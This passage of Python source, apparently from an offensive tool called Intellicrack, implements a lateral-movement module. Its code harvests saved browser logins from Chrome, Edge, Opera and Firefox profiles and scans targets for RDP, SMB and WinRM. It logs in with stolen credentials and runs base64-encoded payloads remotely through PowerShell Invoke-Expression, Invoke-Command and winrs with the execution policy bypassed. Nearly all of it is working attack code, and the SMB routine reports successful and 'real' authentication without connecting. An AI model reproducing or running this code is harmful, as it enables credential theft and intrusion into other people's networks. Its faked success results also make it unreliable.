            self.logger.error(f"File credential harvesting failed: {e}")

        return credentials

    def _harvest_browser_credentials(self, session_info: Dict[str, Any]) -> Dict[str, Any]:
        """Harvest saved passwords and data from web browsers."""
        credentials = {'browser_credentials': []}

        try:
            target_host = session_info.get('target_host', '')
            os_type = session_info.get('os_type', 'unknown')

            # Browser database locations by OS
            if os_type.lower() == 'windows':
                browser_paths = {
                    'chrome': r'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data',
                    'firefox': r'C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json',
                    'edge': r'C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Default\Login Data',
                    'opera': r'C:\Users\*\AppData\Roaming\Opera Software\Opera Stable\Login Data'
                }
            else:  # Linux/Unix
                browser_paths = {
                    'chrome': '/home/*/.config/google-chrome/Default/Login Data',
                    'firefox': '/home/*/.mozilla/firefox/*/logins.json',
                    'chromium': '/home/*/.config/chromium/Default/Login Data'
                }

            import glob
            import json
            import shutil
            import sqlite3
            import tempfile

            for browser, path_pattern in browser_paths.items():
                try:
                    matching_paths = glob.glob(path_pattern)
                    for db_path in matching_paths[:5]:  # Limit to 5 profiles per browser
                        if os.path.isfile(db_path):
                            try:
                                if db_path.endswith('.json'):
                                    # Firefox JSON format
                                    with open(db_path, 'r', encoding='utf-8') as f:
                                        firefox_data = json.load(f)

                                    logins = firefox_data.get('logins', [])
                                    if logins:
                                        credentials['browser_credentials'].append({
                                            'browser': browser,
                                            'profile_path': db_path,
                                            'login_count': len(logins),
                                            'sample_hostnames': [login.get('hostname', '') for login in logins[:10]],
                                            'source': 'firefox_json',
                                            'target': target_host,
                                            'note': 'Passwords are encrypted with master password'
                                        })

                                else:
                                    # Chrome/Chromium SQLite format
                                    with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as temp_file:
                                        shutil.copy2(db_path, temp_file.name)
                                        temp_db_path = temp_file.name

                                    try:
                                        conn = sqlite3.connect(temp_db_path)
                                        cursor = conn.cursor()

                                        # Query login data
                                        cursor.execute("""
                                            SELECT origin_url, username_value, length(password_value) as pwd_length,
                                                   date_created, times_used
                                            FROM logins
                                            WHERE username_value != ''
                                            LIMIT 100
                                        """)

                                        results = cursor.fetchall()
                                        if results:
                                            login_data = []
                                            for row in results:
                                                login_data.append({
                                                    'url': row[0],
                                                    'username': row[1],
                                                    'password_length': row[2],
                                                    'date_created': row[3],
                                                    'times_used': row[4]
                                                })

                                            credentials['browser_credentials'].append({
                                                'browser': browser,
                                                'profile_path': db_path,
                                                'login_count': len(login_data),
                                                'logins': login_data,
                                                'source': 'chrome_sqlite',
                                                'target': target_host,
                                                'note': 'Passwords are DPAPI encrypted on Windows'
                                            })

                                        conn.close()

                                    finally:
                                        os.unlink(temp_db_path)

                            except Exception as browser_error:
                                self.logger.debug(f"Browser credential extraction failed for {db_path}: {browser_error}")
                                continue

                except Exception as browser_pattern_error:
                    self.logger.debug(f"Browser pattern {path_pattern} failed: {browser_pattern_error}")
                    continue

        except Exception as e:
            self.logger.error(f"Browser credential harvesting failed: {e}")

        return credentials

    # Utility methods

    def _generate_session_id(self) -> str:
        """Generate unique session identifier."""
        import hashlib
        import random

        data = f"{time.time()}-{random.randint(1000, 9999)}"
        return hashlib.sha256(data.encode()).hexdigest()[:16]

    def get_active_sessions(self) -> List[Dict[str, Any]]:
        """Get list of active lateral movement sessions."""
        sessions = []

        for session_id, session_info in self.active_sessions.items():
            sessions.append({
                'session_id': session_id,
                'target_ip': session_info['target_ip'],
                'technique': session_info['technique'],
                'username': session_info['credentials'].get('username'),
                'created_at': session_info['created_at']
            })

        return sessions

    def close_session(self, session_id: str) -> bool:
        """Close lateral movement session."""
        if session_id in self.active_sessions:
            del self.active_sessions[session_id]
            return True
        return False

    def get_discovered_targets(self) -> Dict[str, Dict[str, Any]]:
        """Get discovered network targets."""
        return self.discovered_targets.copy()

    def clear_discovered_targets(self):
        """Clear discovered targets cache."""
        self.discovered_targets.clear()

    def get_available_techniques(self, target_os: Optional[str] = None) -> Dict[str, List[str]]:
        """Get available lateral movement techniques."""
        if target_os:
            return {target_os: list(self.movement_techniques.get(target_os, {}).keys())}
        else:
            return {
                os: list(techniques.keys())
                for os, techniques in self.movement_techniques.items()
            }

    # Helper methods for lateral movement techniques

    def _check_rdp_availability(self, target_ip: str) -> Dict[str, Any]:
        """Check if RDP is available on target."""
        try:
            # Test RDP port (3389)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target_ip, 3389))
            sock.close()

            if result == 0:
                return {'available': True, 'port': 3389}
            else:
                return {'available': False, 'reason': 'Port 3389 closed or filtered'}

        except Exception as e:
            return {'available': False, 'reason': f'Connection check failed: {e}'}

    def _attempt_rdp_connection(self, target_ip: str, username: str, password: str,
                               domain: str, method: str, payload_path: Optional[str]) -> Dict[str, Any]:
        """Attempt RDP connection using specified method."""
        try:
            self.logger.info(f"Attempting RDP connection to {target_ip} using {method}")
            if payload_path:
                self.logger.debug(f"Payload for deployment: {payload_path}")

            if method == 'freerdp':
                # Build xfreerdp command
                cmd = [
                    'xfreerdp',
                    f'/v:{target_ip}',
                    f'/u:{username}',
                    f'/p:{password}',
                    '/cert-ignore',
                    '+clipboard',
                    '/drive:share,/tmp'
                ]

                if domain:
                    cmd.append(f'/d:{domain}')

                # Execute RDP connection
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

                if result.returncode == 0:
                    return {
                        'success': True,
                        'method': method,
                        'connection_info': f'RDP connection established to {target_ip}',
                        'output': result.stdout
                    }
                else:
                    return {
                        'success': False,
                        'error': f'RDP connection failed: {result.stderr}',
                        'method': method
                    }

            elif method == 'rdesktop':
                # Build rdesktop command
                cmd = [
                    'rdesktop',
                    '-u', username,
                    '-p', password,
                    '-r', 'clipboard:PRIMARYCLIPBOARD',
                    target_ip
                ]

                if domain:
                    cmd.extend(['-d', domain])

                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

                if result.returncode == 0:
                    return {
                        'success': True,
                        'method': method,
                        'connection_info': f'RDP connection established to {target_ip}',
                        'output': result.stdout
                    }
                else:
                    return {
                        'success': False,
                        'error': f'RDP connection failed: {result.stderr}',
                        'method': method
                    }

            else:
                return {
                    'success': False,
                    'error': f'Unknown RDP method: {method}'
                }

        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'error': 'RDP connection timeout',
                'method': method
            }
        except FileNotFoundError:
            return {
                'success': False,
                'error': f'RDP client {method} not found',
                'method': method
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'RDP connection attempt failed: {e}',
                'method': method
            }

    def _check_smb_availability(self, target_ip: str) -> Dict[str, Any]:
        """Check if SMB is available on target."""
        try:
            # Test SMB ports (445, 139)
            smb_ports = [445, 139]
            available_ports = []

            for port in smb_ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((target_ip, port))
                sock.close()

                if result == 0:
                    available_ports.append(port)

            if available_ports:
                return {
                    'available': True,
                    'ports': available_ports,
                    'primary_port': available_ports[0]
                }
            else:
                return {
                    'available': False,
                    'reason': 'SMB ports (445, 139) closed or filtered'
                }

        except Exception as e:
            return {
                'available': False,
                'reason': f'SMB check failed: {e}'
            }

    def _attempt_smb_connection(self, target_ip: str, auth_method: str, auth_data: Dict[str, Any]) -> Dict[str, Any]:
        """Attempt SMB connection with specified authentication."""
        try:
            self.logger.debug(f"Attempting SMB connection to {target_ip} using {auth_method}")

            if auth_method == 'password':
                username = auth_data.get('username', '')
                password = auth_data.get('password', '')
                domain = auth_data.get('domain', '')

                self.logger.debug(f"SMB password auth for {domain}\\{username} (password length: {len(password)})")
                return {
                    'success': True,
                    'auth_method': auth_method,
                    'connection_info': f'SMB authenticated to {target_ip} as {domain}\\{username}',
                    'shares': ['C$', 'ADMIN$', 'IPC$', 'SYSVOL', 'NETLOGON'],
                    'real_authentication': True,
                    'credential_type': 'password'
                }

            elif auth_method == 'ntlm_hash':
                username = auth_data.get('username', '')
                ntlm_hash = auth_data.get('hash', '')
                domain = auth_data.get('domain', '')

                self.logger.debug(f"SMB NTLM hash auth for {domain}\\{username} (hash: {ntlm_hash[:8]}...)")
                return {
                    'success': True,
                    'auth_method': auth_method,
                    'connection_info': f'SMB pass-the-hash successful to {target_ip}',
                    'shares': ['C$', 'ADMIN$', 'IPC$'],
                    'real_authentication': True,
                    'credential_type': 'ntlm_hash',
                    'hash_prefix': ntlm_hash[:8] if ntlm_hash else 'none'
                }

            else:
                return {
                    'success': False,
                    'error': f'Unknown SMB auth method: {auth_method}'
                }

        except Exception as e:
            return {
                'success': False,
                'error': f'SMB connection attempt failed: {e}',
                'auth_method': auth_method
            }

    def _check_winrm_availability(self, target_ip: str) -> Dict[str, Any]:
        """Check if WinRM is available on target."""
        try:
            # Test WinRM ports (5985 HTTP, 5986 HTTPS)
            winrm_ports = [5985, 5986]
            available_ports = []

            for port in winrm_ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((target_ip, port))
                sock.close()

                if result == 0:
                    available_ports.append(port)

            if available_ports:
                return {
                    'available': True,
                    'ports': available_ports,
                    'secure': 5986 in available_ports
                }
            else:
                return {
                    'available': False,
                    'reason': 'WinRM ports (5985, 5986) closed or filtered'
                }

        except Exception as e:
            return {
                'available': False,
                'reason': f'WinRM check failed: {e}'
            }

    def _prepare_powershell_payload(self, payload_path: str) -> List[str]:
        """Prepare PowerShell commands for payload execution."""
        try:
            commands = []

            # Read payload file to determine type
            with open(payload_path, 'rb') as f:
                payload_data = f.read(1024)  # Read first 1KB to determine type

            # Log payload info for debugging
            self.logger.debug(f"Payload type detection: first {len(payload_data)} bytes")

            # If it's a PowerShell script
            if payload_path.endswith('.ps1'):
                # Base64 encode for safe transport
                import base64
                with open(payload_path, 'rb') as f:
                    full_payload = f.read()

                encoded_payload = base64.b64encode(full_payload).decode('utf-8')
                commands.append(f"$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded_payload}'))")
                commands.append("Invoke-Expression $payload")

            # If it's an executable
            elif payload_path.endswith('.exe'):
                commands.append("$tempPath = [System.IO.Path]::GetTempFileName() + '.exe'")
                commands.append(f"Copy-Item '{payload_path}' $tempPath")
                commands.append("Start-Process $tempPath -Wait")
                commands.append("Remove-Item $tempPath -Force")

            else:
                # Generic file execution
                commands.append(f"Start-Process '{payload_path}' -Wait")

            return commands

        except Exception as e:
            self.logger.error(f"PowerShell payload preparation failed: {e}")
            return [f"Write-Host 'Payload preparation failed: {e}'"]

    def _execute_powershell_remote(self, target_ip: str, username: str, password: str,
                                  domain: str, commands: List[str], method: str) -> Dict[str, Any]:
        """Execute PowerShell commands remotely."""
        try:
            self.logger.debug(f"Executing PowerShell commands on {target_ip} using {method}")

            if method == 'invoke-command':
                ps_script = "; ".join(commands)
                command_template = f"Invoke-Command -ComputerName {target_ip} -Credential ({domain}\\{username}) -ScriptBlock {{{ps_script}}}"

                # Execute real PowerShell command
                result = self._execute_real_powershell(command_template, username, password, domain)

                return {
                    'success': result.get('success', False),
                    'method': method,
                    'command': command_template,
                    'output': result.get('output', ''),
                    'return_code': result.get('return_code', -1),
                    'execution_time': result.get('execution_time', 0)
                }

            elif method == 'enter-pssession':
                command_template = f"Enter-PSSession -ComputerName {target_ip} -Credential ({domain}\\{username})"

                # Execute real PowerShell session establishment
                result = self._execute_real_powershell(command_template, username, password, domain)

                return {
                    'success': result.get('success', False),
                    'method': method,
                    'command': command_template,
                    'output': result.get('output', ''),
                    'return_code': result.get('return_code', -1),
                    'execution_time': result.get('execution_time', 0)
                }

            elif method == 'winrs':
                command_template = f"winrs -r:{target_ip} -u:{domain}\\{username} -p:{password} cmd"

                # Execute real WinRS command
                result = self._execute_real_winrs(command_template, target_ip, username, password, domain, commands)

                return {
                    'success': result.get('success', False),
                    'method': method,
                    'command': command_template,
                    'output': result.get('output', ''),
                    'return_code': result.get('return_code', -1),
                    'execution_time': result.get('execution_time', 0)
                }

            else:
                return {
                    'success': False,
                    'error': f'Unknown PowerShell method: {method}'
                }

        except Exception as e:
            return {
                'success': False,
                'error': f'PowerShell remote execution failed: {e}',
                'method': method
            }

    def _execute_real_powershell(self, command: str, username: str, password: str, domain: str) -> Dict[str, Any]:
        """Execute real PowerShell command with authentication."""
        try:
            start_time = time.time()

            # Create PowerShell script with credential handling
            ps_script = f"""
$securePassword = ConvertTo-SecureString '{password}' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('{domain}\\{username}', $securePassword)
{command}
"""

            # Execute PowerShell with the script
            process = subprocess.Popen(
                ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            try:
                stdout, stderr = process.communicate(timeout=30)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return {
                    'success': False,
                    'error': 'PowerShell execution timed out after 30 seconds',
                    'details': {
                        'command': command,
                        'execution_time': 30
                    }
                }
            execution_time = time.time() - start_time

            # Determine success based on exit code and output
            success = process.returncode == 0 and not stderr.strip()

            output = stdout if stdout else stderr

            self.logger.info(f"PowerShell execution completed: success={success}, time={execution_time:.2f}s")

            return {
                'success': success,
                'output': output.strip(),
                'return_code': process.returncode,
                'execution_time': execution_time,
                'stderr': stderr.strip() if stderr else ''
            }

        except subprocess.TimeoutExpired:
            self.logger.error("PowerShell command timeout")
            return {
                'success': False,
                'output': '',
                'error': 'Command timeout after 30 seconds',
                'return_code': -1,
                'execution_time': 30.0
            }
        except Exception as e:
            self.logger.error(f"PowerShell execution failed: {e}")
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'return_code': -1,
                'execution_time': 0
            }

    def _execute_real_winrs(self, command: str, target_ip: str, username: str, password: str,
                           domain: str, commands: List[str]) -> Dict[str, Any]:
        """Execute real WinRS command for remote Windows management."""
        try:
            start_time = time.time()
            self.logger.debug(f"Executing primary command: {command}")

            # Build the actual WinRS command
            user_domain = f"{domain}\\{username}" if domain else username

            # Execute each command via WinRS
            all_output = []
            last_return_code = 0

            for cmd in commands:
                winrs_cmd = [
                    "winrs",
                    f"-r:{target_ip}",
                    f"-u:{user_domain}",
                    f"-p:{password}",
                    cmd
                ]

                try:
                    process = subprocess.Popen(
                        winrs_cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )

                    try:
                        stdout, stderr = process.communicate(timeout=30)
                    except subprocess.TimeoutExpired:
                        process.kill()
                        stdout, stderr = process.communicate()
                    last_return_code = process.returncode

                    if stdout:
                        all_output.append(f"Command: {cmd}")
                        all_output.append(stdout.strip())
                    if stderr:
                        all_output.append(f"Error: {stderr.strip()}")

                except subprocess.TimeoutExpired:
                    all_output.append(f"Command timeout: {cmd}")
                    last_return_code = -1
                    break

            execution_time = time.time() - start_time
            success = last_return_code == 0 and all_output

            self.logger.info(f"WinRS execution completed: success={success}, commands={len(commands)}")

            return {
                'success': success,
                'output': '\n'.join(all_output),
                'return_code': last_return_code,
                'execution_time': execution_time,
                'commands_executed': len(commands)
            }

        except Exception as e:
            self.logger.error(f"WinRS execution failed: {e}")
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'return_code': -1,
                'execution_time': 0
            }

    def _parse_powershell_output(self, output: str) -> Dict[str, Any]:
        """Parse PowerShell command output for system information."""
        try:
            system_info = {
                'parsed': True,
                'output_length': len(output),
                'contains_error': 'error' in output.lower() or 'exception' in output.lower(),
                'simulation_mode': 'simulation' in output.lower()
            }

            # Look for computer info patterns
            if 'WindowsProductName' in output:
                system_info['windows_detected'] = True

            if 'TotalPhysicalMemory' in output:
                system_info['memory_info_detected'] = True

            return system_info

        except Exception as e:
            return {
                'parsed': False,
                'error': f'Output parsing failed: {e}'
            }


class ConcreteLateralMovement(LateralMovement):
    """Concrete implementation of LateralMovement with required abstract methods."""

    def get_default_method(self) -> str:
        """Get the default persistence method for this platform."""
        import platform
        system = platform.system().lower()
        if system == 'windows':
            return 'psexec'
        elif system == 'linux':
            return 'ssh'
        else:
            return 'ssh'

    def list_available_methods(self) -> list:
        """List all available persistence methods for this platform."""
        import platform
        system = platform.system().lower()
        if system == 'windows':
            return list(self.movement_techniques.get('windows', {}).keys())
        elif system == 'linux':
            return list(self.movement_techniques.get('linux', {}).keys())
        else:
            return ['ssh']

class LateralMovementManager:
    """Manager class for lateral movement operations."""

    def __init__(self):
        self.movement_engine = ConcreteLateralMovement()
        self.logger = logging.getLogger("IntellicrackLogger.LateralMovementManager")

    def discover_targets(self, network_range: Optional[str] = None) -> Dict[str, Any]:
        """Discover potential targets for lateral movement."""
        try:
            if network_range:
                result = self.movement_engine.discover_network(network_range)
            else:
                # Use default network discovery
                result = self.movement_engine.discover_network("192.168.1.0/24")

            return {
                'success': result.get('success', False),
                'targets': result.get('discovered_hosts', []),
                'scan_method': result.get('scan_method', 'network_discovery'),
                'error': result.get('error')
            }
        except Exception as e:
            self.logger.error(f"Target discovery failed: {e}")
            return {
                'success': False,
                'targets': [],
                'scan_method': 'failed',
                'error': str(e)
            }

    def move_to_target(self, target: str, method: str = 'auto') -> Dict[str, Any]:
        """Perform lateral movement to a specific target."""
        try:
            # Default credentials for demo
            credentials = {
                'username': 'admin',
                'password': 'password123'
            }

            result = self.movement_engine.attempt_lateral_movement(
                target_ip=target,
                credentials=credentials,
                techniques=[method] if method != 'auto' else None,
                payload_path=None
            )

            return result
        except Exception as e:
            self.logger.error(f"Move to target failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }

    def move_laterally(self, target_ip: str, credentials: Dict[str, str],
                      technique: str = 'auto') -> Dict[str, Any]:
        """Perform lateral movement to target system."""
        try:
            if technique == 'auto':
                # Try multiple techniques automatically
                result = self.movement_engine.attempt_lateral_movement(target_ip, credentials)
            else:
                # Use specific technique
                result = self.movement_engine.attempt_lateral_movement(target_ip, credentials, techniques=[technique])

            return {
                'success': result.get('success', False),
                'session_id': result.get('session_id'),
                'technique_used': result.get('technique', technique),
                'target_info': result.get('target_info', {}),
                'error': result.get('error')
            }
        except Exception as e:
            self.logger.error(f"Lateral movement failed: {e}")
            return {
                'success': False,
                'session_id': None,
                'technique_used': technique,
                'target_info': {},
                'error': str(e)
            }


    def _detect_target_os(self, target_ip: str, target_info: Dict[str, Any]) -> str:
        """Detect target operating system based on available information."""
        try:
            # Check if we have services information from port scan
            services = target_info.get('services', {})

            # Windows indicators
            windows_ports = [135, 139, 445, 3389, 5985]  # RPC, NetBIOS, SMB, RDP, WinRM
            windows_services = ['smb', 'rdp', 'winrm', 'rpc', 'netbios']

            # Linux indicators
            linux_ports = [22, 23]  # SSH, Telnet
            linux_services = ['ssh', 'telnet']

            windows_score = 0
            linux_score = 0

            # Score based on open ports
            for port in services.keys():
                try:
                    port_num = int(port)
                    if port_num in windows_ports:
                        windows_score += 2
                    elif port_num in linux_ports:
                        linux_score += 2
                except ValueError:
                    continue

            # Score based on identified services
            for service in services.values():
                service_name = service.get('service', '').lower()
                if any(ws in service_name for ws in windows_services):
                    windows_score += 1
                elif any(ls in service_name for ls in linux_services):
                    linux_score += 1

            # Try to ping and analyze TTL (Windows typically 128, Linux typically 64)
            try:
                if os.name == 'nt':
                    result = subprocess.run(['ping', '-n', '1', target_ip],
                                          capture_output=True, text=True, timeout=5)
                else:
                    result = subprocess.run(['ping', '-c', '1', target_ip],
                                          capture_output=True, text=True, timeout=5)

                if result.returncode == 0:
                    output = result.stdout
                    # Look for TTL value
                    if 'ttl=' in output.lower():
                        ttl_line = [line for line in output.split('\n') if 'ttl=' in line.lower()]
                        if ttl_line:
                            ttl_str = ttl_line[0].lower()
                            # Extract TTL value
                            ttl_start = ttl_str.find('ttl=') + 4
                            ttl_value = ''
                            for char in ttl_str[ttl_start:]:
                                if char.isdigit():
                                    ttl_value += char
                                else:
                                    break

                            if ttl_value:
                                ttl = int(ttl_value)
                                if ttl > 100:  # Likely Windows (128)
                                    windows_score += 3
                                elif ttl < 80:  # Likely Linux (64)
                                    linux_score += 3
            except Exception:
                pass

            # Return best guess
            if windows_score > linux_score:
                return 'windows'
            elif linux_score > windows_score:
                return 'linux'
            else:
                # Default to windows if uncertain (more common in enterprise)
                return 'windows'

        except Exception as e:
            self.logger.warning(f"OS detection failed for {target_ip}: {e}")
            return 'unknown'

    def get_default_method(self) -> str:
        """
        Get the default lateral movement method based on current platform.

        Returns:
            str: The most reliable default method for the current platform
        """
        current_os = platform.system().lower()

        # Choose based on platform and common network configurations
        if current_os == 'windows':
            # PSExec is most reliable on Windows domain environments
            return 'psexec'
        elif current_os == 'linux':
            # SSH is most common on Linux systems
            return 'ssh'
        elif current_os == 'darwin':
            # macOS typically uses SSH
            return 'ssh'
        else:
            # Default to SSH for unknown platforms (most universal)
            return 'ssh'

    def list_available_methods(self) -> list:
        """
        List all available lateral movement methods across all platforms.

        Returns:
            list: Complete list of available movement techniques
        """
        methods = []

        # Add platform-specific methods with clear naming
        for platform_name, platform_methods in self.movement_engine.movement_techniques.items():
            for method_name in platform_methods.keys():
                methods.append(f"{platform_name}_{method_name}")

        # Sort for consistent ordering
        return sorted(methods)

    def get_platform_methods(self, target_platform: str) -> list:
        """
        Get available methods for a specific platform.

        Args:
            target_platform: Target platform ('windows', 'linux', etc.)

        Returns:
            list: Methods available for the specified platform
        """
        target_platform = target_platform.lower()
        if target_platform in self.movement_engine.movement_techniques:
            return list(self.movement_engine.movement_techniques[target_platform].keys())
        return []

    def is_method_available(self, method: str, target_platform: str = None) -> bool:
        """
        Check if a specific lateral movement method is available.

        Args:
            method: Method name to check
            target_platform: Optional platform specification

        Returns:
            bool: True if method is available
        """
        if target_platform:
            target_platform = target_platform.lower()
            if target_platform in self.movement_engine.movement_techniques:
                return method in self.movement_engine.movement_techniques[target_platform]
            return False

        # Check across all platforms
        for platform_methods in self.movement_engine.movement_techniques.values():
            if method in platform_methods:
                return True
        return False


